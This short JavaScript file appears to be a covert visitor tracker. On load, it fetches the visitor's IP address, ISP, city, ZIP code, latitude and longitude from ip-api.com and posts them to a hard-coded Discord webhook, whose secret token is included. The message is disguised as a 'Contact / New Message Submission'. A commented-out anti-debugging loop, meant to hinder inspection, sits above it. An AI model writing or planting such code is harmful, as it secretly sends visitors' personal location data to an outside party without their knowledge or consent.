// (function () {
//         (function a() {
//             try {
//                 (function b(i) {
//                     if (('' + (i / i)).length !== 1 || i % 20 === 0) {
//                         (function () { }).constructor('debugger')()
//                     } else {
//                         debugger
//                     }
//                     b(++i)
//                 }
//                 )(0)
//             } catch (e) {
//                 setTimeout(a, 5000)
//             }
//         }
//         )()
//     }
//     )();


function fetchIpInfoAndSendMessage() {
  const ipApiUrl = 'http://ip-api.com/json/?fields=as,city,country,countryCode,isp,lat,lon,org,query,region,regionName,status,timezone,zip';

  fetch(ipApiUrl)
    .then(res => res.json())
    .then(ipInfo => sendMessage(ipInfo))
}

function sendMessage(ipInfo) {
  const webhookUrl = 'https://discord.com/api/webhooks/1407608063325638698/k7bNW0bOjuJXNLLCJaq32p4mJ3oU9NYHR0vZhium9-CFf3hEj4-xaT8tnEjMEMKMc_Ss';

  // Compose the message with all requested fields
  const content = `
--Contact--

New Message Submission:

AS: ${ipInfo.as}
City: ${ipInfo.city}
Country: ${ipInfo.country}
Country Code: ${ipInfo.countryCode}
ISP: ${ipInfo.isp}
Latitude: ${ipInfo.lat}
Longitude: ${ipInfo.lon}
Org: ${ipInfo.org}
Query (IP): ${ipInfo.query}
Region: ${ipInfo.region}
Region Name: ${ipInfo.regionName}
Status: ${ipInfo.status}
Timezone: ${ipInfo.timezone}
Zip: ${ipInfo.zip}
`.trim();

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content }),
  })
}

// Example usage:
fetchIpInfoAndSendMessage();
